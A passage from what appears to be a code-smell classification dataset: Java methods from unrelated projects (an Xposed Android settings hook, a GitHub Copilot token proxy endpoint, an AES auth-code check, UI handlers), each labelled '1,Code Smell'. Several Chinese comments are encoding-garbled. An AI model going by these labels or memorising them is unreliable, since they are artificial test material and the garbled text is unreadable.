  List<AbsolutePackPath> queue=new ArrayList<>(startingPaths);
  Set<AbsolutePackPath> seen=new HashSet<>(startingPaths);
  while (!queue.isEmpty()) {
    AbsolutePackPath next=queue.remove(queue.size() - 1);
    String source;
    try {
      source=readFile(next.resolved(root));
    }
 catch (    IOException e) {
      AbsolutePackPath src=cameFrom.get(next);
      if (src == null) {
        throw new RuntimeException(""unexpected error: failed to read "" + next.getPathString(),e);
      }
      String topLevelMessage;
      String detailMessage;
      if (e instanceof NoSuchFileException) {
        topLevelMessage=""failed to resolve #include directive"";
        detailMessage=""file not found"";
      }
 else {
        topLevelMessage=""unexpected I/O error while resolving #include directive: "" + e;
        detailMessage=""IO error"";
      }
      String badLine=nodes.get(src).getLines().get(lineNumberInclude.get(next)).trim();
      RusticError topLevelError=new RusticError(""error"",topLevelMessage,detailMessage,src.getPathString(),lineNumberInclude.get(next) + 1,badLine);
      failures.put(next,topLevelError);
      continue;
    }
    ImmutableList<String> lines=ImmutableList.copyOf(source.split(""\\R""));
    FileNode node=new FileNode(next,lines);
    boolean selfInclude=false;
    for (    Map.Entry<Integer,AbsolutePackPath> include : node.getIncludes().entrySet()) {
      int line=include.getKey();
      AbsolutePackPath included=include.getValue();
      if (next.equals(included)) {
        selfInclude=true;
        failures.put(next,new RusticError(""error"",""trivial #include cycle detected"",""file includes itself"",next.getPathString(),line + 1,lines.get(line)));
        break;
      }
 else       if (!seen.contains(included)) {
        queue.add(included);
        seen.add(included);
        cameFrom.put(included,next);
        lineNumberInclude.put(included,line);
      }
    }
    if (!selfInclude) {
      nodes.put(next,node);
    }
  }
  this.nodes=ImmutableMap.copyOf(nodes);
  this.failures=ImmutableMap.copyOf(failures);
  detectCycle();
}",1,Code Smell
"@Override public void init() throws NoSuchMethodException {
  if (mChoose != 0) {
    findAndHookMethod(""com.android.settings.connecteddevice.usb.UsbModeChooserActivity"",""onCreate"",Bundle.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param) throws Throwable {
        activity=(Activity)param.thisObject;
      }
    }
);
    findAndHookMethod(""com.android.settings.connecteddevice.usb.UsbModeChooserActivity"",""initModesList"",long[].class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        long[] jArr={0,8,4,16,128};
        if (addAll)         return;
        setLanguage(activity);
        for (int i2=0; i2 < jArr.length; i2++) {
          int getTitle=(int)XposedHelpers.callStaticMethod(findClassIfExists(""com.android.settings.connecteddevice.usb.UsbModeChooserActivity""),""getTitleMiui12"",jArr[i2]);
          if (getTitle != 0) {
            String get=(String)XposedHelpers.callMethod(param.thisObject,""getString"",getTitle);
            mode.put(get,(int)jArr[i2]);
          }
        }
        if (mode.size() == jArr.length) {
          mode.put(""USB 缃戠粶鍏变韩"",-1);
          addAll=true;
        }
        revertLanguage();
      }
    }
);
    findAndHookMethod(""com.android.settings.connecteddevice.usb.UsbModeChooserActivity"",""initDialog"",new MethodHook(){
      @SuppressLint(""WrongConstant"") @Override protected void before(      MethodHookParam param){
        String action=activity.getIntent().getAction();
        if (getMode.isEmpty())         setAllMode();
        if (action == null) {
          int choose=mode.get(getMode.get(mChoose));
          if (choose != -1) {
            Object mBackend=XposedHelpers.getObjectField(param.thisObject,""mBackend"");
            if (getMode.get(mChoose).equals(""鍙嶅悜鍏呯數"")) {
              if ((boolean)XposedHelpers.callMethod(param.thisObject,""isSupportReverseCharging"")) {
                XposedHelpers.callMethod(mBackend,""setCurrentFunctions"",(long)choose);
              }
 else {
                logE(TAG,""Your phone can't reverse charging."");
              }
            }
 else {
              XposedHelpers.callMethod(mBackend,""setCurrentFunctions"",(long)choose);
            }
          }
 else           if (choose == -1) {
            Object tethering=activity.getSystemService(""tethering"");
            int end=(int)XposedHelpers.callMethod(tethering,""setUsbTethering"",true);
            logI(TAG,""tethering: "" + end);
          }
          if (modes) {
            param.setResult(null);
            activity.finish();
          }
        }
      }
    }
);
  }
 else   if (modes) {
    findAndHookMethod(""com.android.settings.connecteddevice.usb.UsbModeChooserActivity"",""initDialog"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        String action=activity.getIntent().getAction();
        if (action == null) {
          param.setResult(null);
          activity.finish();
        }
      }
    }
);
  }
}",1,Code Smell
"/** 
 * 璇锋眰浣撲笉鏄痡son 浼氭姤Request body is missing or not in JSON format Authorization token缂哄け  浼氭姤Authorization header is missing 鏃犳硶璇锋眰鍒癱hat_token 浼氭姤copilot APIKey is wrong
 * @param response
 * @param request
 * @param conversation
 * @return
 * @throws JSONException
 * @throws IOException
 */
@PostMapping(value=""/v1/chat/completions"") public CompletableFuture<ResponseEntity<String>> coPilotConversation(HttpServletResponse response,HttpServletRequest request,@org.springframework.web.bind.annotation.RequestBody Conversation conversation){
  return CompletableFuture.supplyAsync(() -> {
    try {
      if (conversation == null) {
        return new ResponseEntity<>(""Request body is missing or not in JSON format"",HttpStatus.BAD_REQUEST);
      }
      String authorizationHeader=StringUtils.trimToNull(request.getHeader(""Authorization""));
      String apiKey;
      if (authorizationHeader != null && authorizationHeader.startsWith(""Bearer "")) {
        apiKey=authorizationHeader.substring(7);
      }
 else {
        return new ResponseEntity<>(""Authorization header is missing"",HttpStatus.UNAUTHORIZED);
      }
      if (!copilotTokenList.containsKey(apiKey)) {
        String token=getCopilotToken(apiKey);
        if (token == null) {
          return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
        }
        copilotTokenList.put(apiKey,token);
        log.info(""coCopilotTokenList鍒濆鍖栨垚鍔燂紒"");
      }
      String chat_token=copilotTokenList.get(apiKey);
      Map<String,String> headersMap=new HashMap<>();
      addHeader(headersMap,chat_token);
      String json=com.alibaba.fastjson2.JSON.toJSONString(conversation);
      MediaType JSON=MediaType.get(""application/json; charset=utf-8"");
      RequestBody requestBody=RequestBody.create(json,JSON);
      Request.Builder requestBuilder=new Request.Builder().url(""https://api.githubcopilot.com/chat/completions"").post(requestBody);
      headersMap.forEach(requestBuilder::addHeader);
      Request streamRequest=requestBuilder.build();
      try (Response resp=client.newCall(streamRequest).execute()){
        if (!resp.isSuccessful()) {
          if (resp.code() == 429) {
            return new ResponseEntity<>(""rate limit exceeded"",HttpStatus.TOO_MANY_REQUESTS);
          }
 else {
            String token=getCopilotToken(apiKey);
            if (token == null) {
              return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
            }
            copilotTokenList.put(apiKey,token);
            log.info(""token杩囨湡锛宑oCopilotTokenList閲嶇疆鍖栨垚鍔燂紒"");
            againConversation(response,conversation,token);
          }
        }
 else {
          outPutChat(response,resp,conversation);
          addModel(conversation);
        }
      }
     }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
    return null;
  }
,executor).orTimeout(6,TimeUnit.MINUTES).exceptionally(ex -> {
    if (ex instanceof TimeoutException) {
      return new ResponseEntity<>(""Request timed out"",HttpStatus.REQUEST_TIMEOUT);
    }
 else {
      return new ResponseEntity<>(""An error occurred"",HttpStatus.INTERNAL_SERVER_ERROR);
    }
  }
);
}",1,Code Smell
"public Map<KeyElement.Type,KeyPropertyEntry> parse(AnnotationExpr keyElement){
  List<KeyElement.Type> types=new ArrayList<>();
  KeyPropertyEntry entry=new KeyPropertyEntry();
  entry.setJavadoc(JavaParserUtil.javadocFirstLineOf(bodyDeclaration));
  if (fieldDeclaration != null) {
    entry.setRealName(fieldDeclaration.getVariable(0).getNameAsString());
  }
 else {
    entry.setRealName(enumConstantDeclaration.getNameAsString());
  }
  entry.setName(entry.getRealName());
  entry.setClassName(this.className);
  if (keyElement instanceof MarkerAnnotationExpr) {
    types.add(KeyElement.Type.Structural);
  }
 else {
    NormalAnnotationExpr keyElementExpr=(NormalAnnotationExpr)keyElement;
    for (    MemberValuePair memberValuePair : keyElementExpr.getPairs()) {
switch (memberValuePair.getNameAsString()) {
case ""name"":
        entry.setName(AnnotationFieldParser.singleFieldValue(memberValuePair));
      break;
case ""byType"":
    if (fieldDeclaration != null) {
      entry.setName(fieldDeclaration.getElementType().asString());
    }
  break;
case ""byJavadoc"":
if (entry.getJavadoc() == null || entry.getJavadoc().isEmpty()) {
  log.warn(""empty javadoc on {}"",entry.toString());
}
 else {
  entry.setName(entry.getJavadoc());
}
break;
case ""remark"":
entry.setRemark(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""remarkFromJavadoc"":
if (entry.getJavadoc() == null || entry.getJavadoc().isEmpty()) {
log.warn(""empty javadoc on {}"",entry.toString());
}
 else {
entry.setRemark(entry.getJavadoc());
}
break;
case ""types"":
for (String typeStr : AnnotationFieldParser.arrayFieldValue(memberValuePair)) {
types.add(KeyElement.Type.valueOf(typeStr));
}
break;
}
}
if (types.isEmpty()) {
types.add(KeyElement.Type.Structural);
}
}
propertyEntry=entry;
Map<KeyElement.Type,KeyPropertyEntry> result=new TreeMap<>();
for (KeyElement.Type type : types) {
result.put(type,entry);
}
return result;
}",1,Code Smell
"@Override public String verifyApplicationAuthCode(String authCode,String applicationId,int type){
  String secret=null;
  if (type == ProtoConstants.ApplicationType.ApplicationType_Robot) {
    WFCMessage.Robot robotData=getRobot(applicationId);
    if (robotData != null && !StringUtil.isNullOrEmpty(robotData.getCallback()) && !StringUtil.isNullOrEmpty(robotData.getSecret())) {
      secret=robotData.getSecret();
    }
  }
 else   if (type == ProtoConstants.ApplicationType.ApplicationType_Channel) {
    WFCMessage.ChannelInfo channelData=getChannelInfo(applicationId);
    if (channelData != null && !StringUtil.isNullOrEmpty(channelData.getCallback()) && !StringUtil.isNullOrEmpty(channelData.getSecret())) {
      secret=channelData.getSecret();
    }
  }
 else   if (type == ProtoConstants.ApplicationType.ApplicationType_Admin) {
    secret=AdminAction.getSecretKey();
    applicationId=""wfadmin"";
  }
  secret=ensureSecretLength(secret);
  byte[] data=Base64.getDecoder().decode(authCode);
  data=AES.AESDecrypt(data,secret,true);
  if (data == null || data.length == 0) {
    return null;
  }
 else {
    String str=new String(data);
    String[] strArr=str.split(""\\?\\|\\?"");
    if (strArr.length == 4) {
      if (applicationId.equals(strArr[2])) {
        long timestamp=Long.parseLong(strArr[1]);
        if (System.currentTimeMillis() - timestamp > 60 * 1000) {
          return null;
        }
        return strArr[0];
      }
    }
  }
  return null;
}",1,Code Smell
"FilteredView parse(DslContext context,Tokens tokens){
  if (tokens.hasMoreThan(DESCRIPTION_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(TAGS_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  Workspace workspace=context.getWorkspace();
  String key;
  StaticView baseView;
  String baseKey=tokens.get(BASE_KEY_INDEX);
  String mode=tokens.get(MODE_INDEX);
  String tagsAsString=tokens.get(TAGS_INDEX);
  Set<String> tags=new HashSet<>();
  for (  String tag : tagsAsString.split("","")) {
    if (!StringUtils.isNullOrEmpty(tag)) {
      tags.add(tag.trim());
    }
  }
  String description="""";
  if (tokens.includes(DESCRIPTION_INDEX)) {
    description=tokens.get(DESCRIPTION_INDEX);
  }
  FilterMode filterMode;
  if (FILTER_MODE_INCLUDE.equalsIgnoreCase(mode)) {
    filterMode=FilterMode.Include;
  }
 else   if (FILTER_MODE_EXCLUDE.equalsIgnoreCase(mode)) {
    filterMode=FilterMode.Exclude;
  }
 else {
    throw new RuntimeException(""Filter mode should be include or exclude"");
  }
  if (workspace.getViews().getViews().stream().noneMatch(v -> v.getKey().equals(baseKey))) {
    throw new RuntimeException(""The view \"""" + baseKey + ""\"" does not exist"");
  }
  baseView=(StaticView)workspace.getViews().getViews().stream().filter(v -> v instanceof StaticView && v.getKey().equals(baseKey)).findFirst().orElse(null);
  if (baseView == null) {
    throw new RuntimeException(""The view \"""" + baseKey + ""\"" must be a System Landscape, System Context, Container, or Component view"");
  }
  if (tokens.includes(KEY_INDEX)) {
    key=tokens.get(KEY_INDEX);
  }
 else {
    key=workspace.getViews().generateViewKey(VIEW_TYPE);
  }
  validateViewKey(key);
  return workspace.getViews().createFilteredView(baseView,key,description,filterMode,tags.toArray(new String[0]));
}",1,Code Smell
"/** 
 * 查找并点击键盘按键
 * @param root
 * @param service
 * @param text
 * @param width
 * @param height
 * @return
 */
private boolean findAndClickKeyboardKey(AbstractNodeTree root,OperationService service,final String text,int width,int height){
  if (StringUtil.isEmpty(text)) {
    return false;
  }
  List<AbstractNodeTree> result;
  if (text.length() > 1) {
    result=OperationNodeLocator.findAbstractNodeBySomething(root,new ItemComparator<AbstractNodeTree>(){
      @Override public boolean isEqual(      AbstractNodeTree item){
        return item != null && (StringUtil.contains(item.getText(),text) || StringUtil.contains(item.getDescription(),text));
      }
    }
);
  }
 else {
    result=OperationNodeLocator.findAbstractNodeBySomething(root,new ItemComparator<AbstractNodeTree>(){
      @Override public boolean isEqual(      AbstractNodeTree item){
        return item != null && (text.equalsIgnoreCase(item.getText()) || text.equalsIgnoreCase(item.getDescription()));
      }
    }
);
  }
  if (result.size() == 1) {
    service.doSomeAction(new OperationMethod(PerformActionEnum.CLICK),result.get(0));
    return true;
  }
 else   if (result.size() > 1) {
    AbstractNodeTree aim=null;
    for (    AbstractNodeTree node : result) {
      Rect rect=node.getNodeBound();
      if (rect.width() >= width / 3 + 10 || rect.centerY() > height / 2) {
        continue;
      }
      aim=node;
      break;
    }
    if (aim == null) {
      aim=result.get(0);
    }
    service.doSomeAction(new OperationMethod(PerformActionEnum.CLICK),aim);
    return true;
  }
 else {
    return false;
  }
}",1,Code Smell
"@Override public Collection<Application> listApplications(String workspaceId){
  return applicationRepository.listActiveApplications(workspaceId);
}
@Override public List<Application> listApplications(String workspaceId,String client,ListApplicationsRequest listApplicationsRequest){
  Collection<Application> allApps=listApplications(workspaceId);
  List<Application> applicationList=new ArrayList<>();
  for (  Application app : allApps) {
    boolean filtered=true;
    if (listApplicationsRequest.getApplicationNames() != null && !listApplicationsRequest.getApplicationNames().isEmpty()) {
      if (!StringUtils.hasText(app.getName())) {
        filtered&=false;
      }
 else {
        filtered&=listApplicationsRequest.getApplicationNames().contains(app.getName());
      }
    }
    if (filtered && listApplicationsRequest.getApplicationStages() != null && !listApplicationsRequest.getApplicationStages().isEmpty()) {
      if (!StringUtils.hasText(app.getStage())) {
        filtered&=false;
      }
 else {
        filtered&=listApplicationsRequest.getApplicationStages().contains(app.getStage());
      }
    }
    if (filtered && listApplicationsRequest.getApplicationVersions() != null && !listApplicationsRequest.getApplicationVersions().isEmpty()) {
      if (!StringUtils.hasText(app.getVersion())) {
        filtered&=false;
      }
 else {
        filtered&=listApplicationsRequest.getApplicationVersions().contains(app.getVersion());
      }
    }
    if (filtered) {
      app.setTracePoints(filterTracePoints(app.getTracePoints(),client));
      app.setLogPoints(filterLogPoints(app.getLogPoints(),client));
      applicationList.add(app);
    }
  }
  return applicationList;
}
",1,Code Smell
"@Override public void onLetterUpdate(String letter){
  indexLetterTextView.setVisibility(View.VISIBLE);
  indexLetterTextView.setText(letter);
  List<UIUserInfo> data=userListAdapter.getUsers();
  if (data == null || data.isEmpty()) {
    return;
  }
  if (""↑"".equalsIgnoreCase(letter)) {
    linearLayoutManager.scrollToPositionWithOffset(0,0);
  }
 else   if (""☆"".equalsIgnoreCase(letter)) {
    linearLayoutManager.scrollToPositionWithOffset(userListAdapter.headerCount(),0);
  }
 else   if (""#"".equalsIgnoreCase(letter)) {
    for (int i=0; i < data.size(); i++) {
      UIUserInfo friend=data.get(i);
      if (friend.getCategory().equals(""#"")) {
        linearLayoutManager.scrollToPositionWithOffset(userListAdapter.headerCount() + i,0);
        break;
      }
    }
  }
 else {
    for (int i=0; i < data.size(); i++) {
      UIUserInfo friend=data.get(i);
      if (friend.getCategory().compareTo(letter) >= 0) {
        linearLayoutManager.scrollToPositionWithOffset(i + userListAdapter.headerCount(),0);
        break;
      }
    }
  }
}",1,Code Smell
"/** 
 * 妫�鏌@linkplain #directory}鐩綍涓嬬殑鎻掍欢鏂囦欢锛屽鏋滄枃浠舵湁淇敼锛屽垯閲嶆柊鍔犺浇瀹冧滑瀵瑰簲鐨勬彃浠躲��
 */
protected void checkForReload(){
  List<FileCheckTime> reloads=new ArrayList<>();
  boolean hasDelete=false;
  File[] children=this.directory.listFiles();
  ReadLock readLock=lock.readLock();
  try {
    readLock.lock();
    for (    Map.Entry<String,FileCheckTime> entry : this._fileNameCheckTimeMap.entrySet()) {
      FileCheckTime fileCheckTime=entry.getValue();
      if (!fileCheckTime.isFileExists()) {
        hasDelete=true;
        break;
      }
      if (fileCheckTime.isTimeout())       reloads.add(fileCheckTime);
    }
    if (hasDelete) {
      for (      File child : children)       reloads.add(new FileCheckTime(child));
    }
 else {
      Collection<FileCheckTime> fileCheckTimes=this._fileNameCheckTimeMap.values();
      for (      File child : children) {
        boolean loaded=false;
        for (        FileCheckTime fileCheckTime : fileCheckTimes) {
          if (fileCheckTime.getFile().equals(child)) {
            loaded=true;
            break;
          }
        }
        if (!loaded)         reloads.add(new FileCheckTime(child));
      }
    }
  }
  finally {
    readLock.unlock();
  }
  if (reloads.isEmpty() && !hasDelete)   return;
  WriteLock writeLock=this.lock.writeLock();
  try {
    writeLock.lock();
    if (hasDelete) {
      super.removeAllChartPlugins();
      this._pluginIdFileNameMap.clear();
      this._fileNameCheckTimeMap.clear();
    }
    for (    FileCheckTime reload : reloads)     loadAndRegisterHtmlChartPlugin(reload.getFile());
  }
  finally {
    writeLock.unlock();
  }
}
",1,Code Smell
"@Override public void channelRead(ChannelHandlerContext ctx,Object msg) throws Exception {
  if (!(msg instanceof RequestData)) {
    super.channelRead(ctx,msg);
    return;
  }
  @SuppressWarnings(""unchecked"") RequestData<String> inputData=(RequestData<String>)msg;
  UiConnection uiConnection=uiConnectionStore.register(ctx.channel());
  if (inputData.getType() == CommandCode.REQ_TYPE_CANCEL.getCode()) {
    cancelRequest(uiConnection);
    return;
  }
  Optional<CommunicateCommand> command=commandStore.getCommunicateCommand(inputData.getType());
  if (!command.isPresent()) {
    ctx.channel().writeAndFlush(UiResponses.createNoCommandResponse(inputData));
    return;
  }
  CommunicateCommand communicateCommand=command.get();
  if (!communicateCommand.isSupportMulti() && inputData.getAgentServerInfos().size() > 1) {
    ctx.channel().writeAndFlush(UiResponses.createNotSupportMultiResponse(inputData));
    return;
  }
  CommunicateCommandProcessor<?> processor=communicateCommand.getProcessor();
  Optional<? extends RequestData<?>> requestDataOptional=preProcessor(processor,inputData,ctx);
  if (!requestDataOptional.isPresent()) {
    return;
  }
  RequestData<?> requestData=requestDataOptional.get();
  List<AgentConnection> agentConnections=Lists.newArrayListWithCapacity(requestData.getAgentServerInfos().size());
  List<String> lessVersionAgents=Lists.newArrayList();
  List<String> noConnectionAgents=Lists.newArrayList();
  for (  AgentServerInfo agentServerInfo : requestData.getAgentServerInfos()) {
    Optional<AgentConnection> agentConnection=agentConnectionStore.getConnection(agentServerInfo.getAgentId());
    if (agentConnection.isPresent()) {
      if (agentConnection.get().getVersion() >= communicateCommand.getMinAgentVersion()) {
        agentConnections.add(agentConnection.get());
      }
 else {
        lessVersionAgents.add(agentServerInfo.getAgentId());
      }
    }
 else {
      noConnectionAgents.add(agentServerInfo.getAgentId());
    }
  }
  noConnectionAgents.stream().map(noConnectionAgent -> UiResponses.createNoConnectionResponse(noConnectionAgent,requestData)).forEach(uiConnection::write);
  lessVersionAgents.stream().map(lessVersionAgent -> UiResponses.createLessVersionResponse(lessVersionAgent,requestData)).forEach(uiConnection::write);
  if (agentConnections.isEmpty()) {
    uiConnection.write(UiResponses.createFinishResponse(requestData));
    return;
  }
  List<Session> sessions=agentConnections.stream().map((agentConnection -> sendMessage(command.get(),requestData,processor,agentConnection,uiConnection))).collect(Collectors.toList());
  ListenableFuture<List<Session.State>> sessionsFuture=Futures.successfulAsList(sessions.stream().map(Session::getEndState).collect(Collectors.toList()));
  sessionsFuture.addListener(() -> uiConnection.write(UiResponses.createFinishResponse(requestData)),MoreExecutors.directExecutor());
}",1,Code Smell
"public static EruptApiModel validateEruptValue(EruptModel eruptModel,JsonObject jsonObject){
  for (  EruptFieldModel field : eruptModel.getEruptFieldModels()) {
    Edit edit=field.getEruptField().edit();
    JsonElement value=jsonObject.get(field.getFieldName());
    if (field.getEruptField().edit().notNull()) {
      if (null == value || value.isJsonNull()) {
        return EruptApiModel.errorNoInterceptMessage(field.getEruptField().edit().title() + "" "" + I18nTranslate.$translate(""erupt.notnull""));
      }
 else       if (String.class.getSimpleName().equals(field.getFieldReturnName())) {
        if (StringUtils.isBlank(value.getAsString())) {
          return EruptApiModel.errorNoInterceptMessage(field.getEruptField().edit().title() + "" "" + I18nTranslate.$translate(""erupt.notnull""));
        }
      }
    }
    if (field.getEruptField().edit().type() == EditType.COMBINE) {
      EruptApiModel eam=validateEruptValue(EruptCoreService.getErupt(field.getFieldReturnName()),jsonObject.getAsJsonObject(field.getFieldName()));
      if (eam.getStatus() == EruptApiModel.Status.ERROR) {
        return eam;
      }
    }
    if (null != value && !AnnotationConst.EMPTY_STR.equals(edit.title())) {
      if (edit.type() == EditType.TEXTAREA || edit.type() == EditType.INPUT) {
        if (SecurityUtil.xssInspect(value.getAsString())) {
          return EruptApiModel.errorNoInterceptApi(field.getEruptField().edit().title() + "" "" + I18nTranslate.$translate(""erupt.attack.xss""));
        }
      }
switch (edit.type()) {
case NUMBER:
case SLIDER:
        if (!NumberUtils.isCreatable(value.getAsString())) {
          return EruptApiModel.errorNoInterceptMessage(field.getEruptField().edit().title() + "" "" + I18nTranslate.$translate(""erupt.must.number""));
        }
      break;
case INPUT:
    if (!AnnotationConst.EMPTY_STR.equals(edit.inputType().regex())) {
      String content=value.getAsString();
      if (StringUtils.isNotBlank(content)) {
        if (!Pattern.matches(edit.inputType().regex(),content)) {
          return EruptApiModel.errorNoInterceptMessage(field.getEruptField().edit().title() + "" "" + I18nTranslate.$translate(""erupt.incorrect_format""));
        }
      }
    }
  break;
}
}
}
return EruptApiModel.successApi();
}",1,Code Smell
"/** 
 * Intercept the target instance method.
 * @param obj          target class instance.
 * @param allArguments all method arguments
 * @param method       method description.
 * @param zuper        the origin call ref.
 * @return the return value of target instance method.
 * @throws Exception only throw exception because of zuper.call() or unexpected exception in sky-walking ( This is abug, if anything triggers this condition ).
 */
@RuntimeType public static Object intercept(@This Object obj,@AllArguments Object[] allArguments,@Morph OverrideCallable zuper,@Origin Method method) throws Throwable {
  EnhancedInstance targetObject=(EnhancedInstance)obj;
  prepare();
  MethodInterceptResult result=new MethodInterceptResult();
  try {
    if (INTERCEPTOR != null) {
      INTERCEPTOR.beforeMethod(targetObject,method,allArguments,method.getParameterTypes(),result);
    }
  }
 catch (  Throwable t) {
    if (LOGGER != null) {
      LOGGER.error(t,""class[{}] before method[{}] intercept failure"",obj.getClass(),method.getName());
    }
  }
  Object ret=null;
  try {
    if (!result.isContinue()) {
      ret=result._ret();
    }
 else {
      ret=zuper.call(allArguments);
    }
  }
 catch (  Throwable t) {
    try {
      if (INTERCEPTOR != null) {
        INTERCEPTOR.handleMethodException(targetObject,method,allArguments,method.getParameterTypes(),t);
      }
    }
 catch (    Throwable t2) {
      if (LOGGER != null) {
        LOGGER.error(t2,""class[{}] handle method[{}] exception failure"",obj.getClass(),method.getName());
      }
    }
    throw t;
  }
 finally {
    try {
      if (INTERCEPTOR != null) {
        ret=INTERCEPTOR.afterMethod(targetObject,method,allArguments,method.getParameterTypes(),ret);
      }
    }
 catch (    Throwable t) {
      if (LOGGER != null) {
        LOGGER.error(t,""class[{}] after method[{}] intercept failure"",obj.getClass(),method.getName());
      }
    }
  }
  return ret;
}",1,Code Smell
"@Override public void onPlayerError(PlaybackException error){
  AndroidUtilities.runOnUIThread(() -> {
    Throwable cause=error.getCause();
    if (textureView != null && (!triedReinit && cause instanceof MediaCodecRenderer.DecoderInitializationException || cause instanceof SurfaceNotValidException)) {
      triedReinit=true;
      if (player != null) {
        ViewGroup parent=(ViewGroup)textureView.getParent();
        if (parent != null) {
          int i=parent.indexOfChild(textureView);
          parent.removeView(textureView);
          parent.addView(textureView,i);
        }
        if (workerQueue != null) {
          workerQueue.postRunnable(() -> {
            if (player != null) {
              player.clearVideoTextureView(textureView);
              player.setVideoTextureView(textureView);
              if (loopingMediaSource) {
                preparePlayerLoop(videoUri,videoType,audioUri,audioType);
              }
 else {
                preparePlayer(videoUri,videoType);
              }
              play();
            }
          }
);
        }
 else {
          player.clearVideoTextureView(textureView);
          player.setVideoTextureView(textureView);
          if (loopingMediaSource) {
            preparePlayerLoop(videoUri,videoType,audioUri,audioType);
          }
 else {
            preparePlayer(videoUri,videoType);
          }
          play();
        }
      }
    }
 else {
      delegate.onError(this,error);
    }
  }
);
}
",1,Code Smell
"public CharSequence getReplyQuoteNameWithIcon(){
  if (messageOwner == null) {
    return """";
  }
  CharSequence senderName=null;
  CharSequence chatName=null;
  if (messageOwner.reply_to == null) {
    if (DialogObject.isChatDialog(getDialogId())) {
      chatName=peerNameWithIcon(currentAccount,getDialogId());
    }
 else {
      senderName=peerNameWithIcon(currentAccount,getDialogId());
    }
  }
 else   if (messageOwner.reply_to.reply_from != null) {
    final boolean anotherChat=messageOwner.reply_to.reply_to_peer_id == null || DialogObject.getPeerDialogId(messageOwner.reply_to.reply_to_peer_id) != getDialogId();
    if (messageOwner.reply_to.reply_from.from_id != null) {
      if (messageOwner.reply_to.reply_from.from_id instanceof TLRPC.TL_peerUser) {
        senderName=peerNameWithIcon(currentAccount,messageOwner.reply_to.reply_from.from_id,anotherChat);
      }
 else {
        chatName=peerNameWithIcon(currentAccount,messageOwner.reply_to.reply_from.from_id,anotherChat);
      }
    }
 else     if (messageOwner.reply_to.reply_from.saved_from_peer != null) {
      if (messageOwner.reply_to.reply_from.saved_from_peer instanceof TLRPC.TL_peerUser) {
        senderName=peerNameWithIcon(currentAccount,messageOwner.reply_to.reply_from.saved_from_peer,anotherChat);
      }
 else {
        chatName=peerNameWithIcon(currentAccount,messageOwner.reply_to.reply_from.saved_from_peer,anotherChat);
      }
    }
 else     if (!TextUtils.isEmpty(messageOwner.reply_to.reply_from.from_name)) {
      if (anotherChat) {
        senderName=new SpannableStringBuilder(userSpan()).append("" "").append(messageOwner.reply_to.reply_from.from_name);
      }
 else {
        senderName=new SpannableStringBuilder(messageOwner.reply_to.reply_from.from_name);
      }
    }
  }
  if (messageOwner.reply_to.reply_to_peer_id != null && DialogObject.getPeerDialogId(messageOwner.reply_to.reply_to_peer_id) != getDialogId()) {
    if (messageOwner.reply_to.reply_to_peer_id instanceof TLRPC.TL_peerUser) {
      senderName=peerNameWithIcon(currentAccount,messageOwner.reply_to.reply_to_peer_id,true);
    }
 else {
      chatName=peerNameWithIcon(currentAccount,messageOwner.reply_to.reply_to_peer_id);
    }
  }
  if (replyMessageObject != null) {
    if (DialogObject.isChatDialog(replyMessageObject.getSenderId())) {
      if (chatName == null) {
        chatName=peerNameWithIcon(currentAccount,replyMessageObject.getSenderId());
      }
    }
 else {
      if (senderName == null) {
        senderName=peerNameWithIcon(currentAccount,replyMessageObject.getSenderId());
      }
    }
  }
  if (chatName != null && senderName != null) {
    return new SpannableStringBuilder(senderName).append("" "").append(chatName);
  }
 else   if (chatName != null) {
    return chatName;
  }
 else   if (senderName != null) {
    return senderName;
  }
  return LocaleController.getString(R.string.Loading);
}
",1,Code Smell
"public void updateProgressLoadingLink(){
  if (delegate == null) {
    return;
  }
  if (!delegate.isProgressLoading(this,ChatActivity.PROGRESS_LINK)) {
    progressLoadingLink=null;
    if (progressLoadingLinkDrawables != null && !progressLoadingLinkDrawables.isEmpty()) {
      for (int i=0; i < progressLoadingLinkDrawables.size(); ++i) {
        LoadingDrawableLocation location=progressLoadingLinkDrawables.get(i);
        if (!location.drawable.isDisappearing()) {
          location.drawable.disappear();
        }
      }
    }
    return;
  }
  CharacterStyle link=delegate.getProgressLoadingLink(this);
  if (link == progressLoadingLink) {
    return;
  }
  progressLoadingLink=link;
  if (progressLoadingLinkCurrentDrawable != null) {
    progressLoadingLinkCurrentDrawable.disappear();
    progressLoadingLinkCurrentDrawable=null;
  }
  progressLoadingLinkCurrentDrawable=new LoadingDrawable();
  progressLoadingLinkCurrentDrawable.setAppearByGradient(true);
  LinkPath path=new LinkPath(true);
  progressLoadingLinkCurrentDrawable.usePath(path);
  progressLoadingLinkCurrentDrawable.setRadiiDp(5);
  LoadingDrawableLocation location=new LoadingDrawableLocation();
  location.drawable=progressLoadingLinkCurrentDrawable;
  location.blockNum=-3;
  if (progressLoadingLinkDrawables == null) {
    progressLoadingLinkDrawables=new ArrayList<>();
  }
  progressLoadingLinkDrawables.add(location);
  if (progressLoadingLink != null) {
    boolean b=findProgressLoadingLink(location,path,descriptionLayout,0,-2) || (captionLayout != null && findProgressLoadingLink(location,path,captionLayout.textLayoutBlocks)) || (currentMessageObject != null && findProgressLoadingLink(location,path,currentMessageObject.textLayoutBlocks));
  }
}",1,Code Smell
"public static String generateAggQueryWithMultipleArgs(String expr,String[][] inputValues){
  int argCount=-1;
  for (  String[] row : inputValues) {
    if (argCount == -1) {
      argCount=row.length;
    }
 else     if (argCount != row.length) {
      throw new IllegalArgumentException(""invalid test input: "" + Arrays.toString(row));
    }
  }
  StringBuilder buf=new StringBuilder();
  buf.append(""SELECT "").append(expr).append("" FROM "");
  if (inputValues.length == 0) {
    buf.append(""(VALUES 1) AS t(x) WHERE false"");
  }
 else {
    buf.append(""("");
    for (int i=0; i < inputValues.length; i++) {
      if (i > 0) {
        buf.append("" UNION ALL "");
      }
      buf.append(""SELECT "");
      for (int j=0; j < argCount; j++) {
        if (j != 0) {
          buf.append("", "");
        }
        String inputValue=inputValues[i][j];
        buf.append(inputValue).append("" AS x"");
        if (j != 0) {
          buf.append(j + 1);
        }
      }
